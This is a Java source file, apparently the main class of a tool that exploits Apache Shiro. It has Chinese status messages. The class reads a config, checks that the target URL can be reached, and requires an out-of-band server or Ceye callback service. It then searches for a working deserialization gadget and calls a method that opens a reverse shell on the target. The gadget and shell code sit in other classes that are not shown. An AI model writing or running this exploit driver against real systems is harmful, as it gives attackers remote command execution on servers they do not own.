package com.shiroexploit.core;

import com.shiroexploit.util.Config;
import com.shiroexploit.util.ExploitFailedException;
import com.shiroexploit.vulnverifier.Verifier;
import com.shiroexploit.vulnverifier.VerifierFactory;

public class Exploit {
    public static void main(String[] args){

        System.out.println("[*] 读取配置文件");
        Config.getInstance();

        if(!Config.getInstance().isTargetURLVisitable()){
            System.out.println("[!] 目标URL无法正常访问，请确认目标URL是否输入正确");
            System.exit(0);
        }

        boolean bool1 = Config.getInstance().isOOBServerSetProperly();
        boolean bool2 = Config.getInstance().isCeyeConfigSetProperly();


        if(!bool1 && !bool2){
            System.out.println("[!] 您必须至少配置一个有效的OOBServer或者Ceye");
            System.exit(0);
        }

        Verifier verifier = VerifierFactory.getInstance(Config.getInstance(), bool1);
        try {
            verifier.getValidGadget();
        } catch (ExploitFailedException e) {
            System.out.println(e.getMessage());
            System.exit(0);
        }
        System.out.println("[*] Trying executing command...");
        verifier.getReverseShell();
        System.out.println("[*] Program done");
    }
}